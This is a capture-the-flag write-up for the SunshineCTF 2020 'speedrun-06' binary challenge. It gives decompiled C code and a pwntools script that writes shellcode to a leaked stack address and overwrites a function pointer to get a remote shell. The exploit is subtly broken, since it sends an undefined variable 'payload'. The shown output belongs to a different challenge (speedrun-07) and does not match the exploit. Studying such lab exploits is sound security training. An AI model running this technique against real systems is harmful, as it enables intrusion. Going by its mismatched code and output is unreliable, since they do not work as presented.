# **speedrun-06**
## Task
nc chal.2020.sunshinectf.org 30006
File: chall_06
Tag: binary exploitation 

## Solution

### Checksec
```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
```
* No Canary + NC disabled + RWX assume shellcode BOF
### Decompile with ghidra
```c
void main(void)
{
  char local_d8 [208];
  
  printf("Letting my armor fall again: %p\n",local_d8);
  fgets(local_d8,199,stdin);
  vuln();
  return;
}

void vuln(void)
{
  char local_48 [56];
  code *local_10;
  
  puts("For saving me from all they\'ve taken.");
  fgets(local_48,100,stdin);
  (*local_10)();
  return;
}
```
In this challenge, We don't have `win` anymore,but NX disabled so just write out the shellcode to `local_d8` then overwrite `local_10` value  in `vuln` to the address of `local_d8` to execute the shellcode

### Exploit
```python
from pwn import *

binary = context.binary = ELF('./chall_06')

p = remote('chal.2020.sunshinectf.org',30006)
p.recvuntil('Letting my armor fall again: ')

shelladdr = int(p.recvline().strip(),16)
shellpayload = b''
shellpayload += asm(shellcraft.sh())
p.sendline(payload)

payloadPadding = b'a' * (0x48 - 0x10)
payloadPadding += p64(shelladdr)
p.sendline(payloadPadding)
p.interactive()
```
### Output
Because the server was down for this challenge when I write up so I have no output for it, following here is a output from other author
```bash
[*] '/pwd/datajerk/sunshinectf2020/speedrun-07/chall_07'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
[+] Opening connection to chal.2020.sunshinectf.org on port 30007: Done
[*] Switching to interactive mode
In the land of raw humanity$ id
uid=1000(chall_07) gid=1000(chall_07) groups=1000(chall_07)
$ ls -l
total 16
-rwxr-xr-x 1 root root     8440 Nov  7 07:49 chall_07
-rw-r----- 1 root chall_07   33 Nov  7 08:51 flag.txt
$ cat flag.txt
sun{sidewinder-a80d0be1840663c4}
```

